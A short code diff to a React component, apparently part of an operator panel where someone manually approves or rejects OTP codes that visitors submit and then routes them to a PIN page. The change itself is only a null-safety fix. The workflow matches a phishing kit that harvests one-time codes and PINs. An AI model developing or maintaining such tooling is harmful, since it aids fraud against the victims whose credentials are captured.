@@ -415,12 +415,12 @@ export function VisitorDetails({ visitor }: VisitorDetailsProps) {
         case "otp":
           if (action === "approve") {
             // Approve OTP using proper handler
-            await handleOtpApproval(visitor.id, bubble.id, visitor.history)
+            await handleOtpApproval(visitor.id, bubble.id, visitor.history || [])
             alert("تم قبول كود OTP! سيتم توجيه الزائر لصفحة PIN")
           } else if (action === "reject") {
             if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
               // Reject OTP using proper handler
-              await handleOtpRejection(visitor.id, bubble.id, visitor.history)
+              await handleOtpRejection(visitor.id, bubble.id, visitor.history || [])
               alert("تم رفض كود OTP! سيتم توجيه الزائر لإدخال كود جديد")
             }
           }
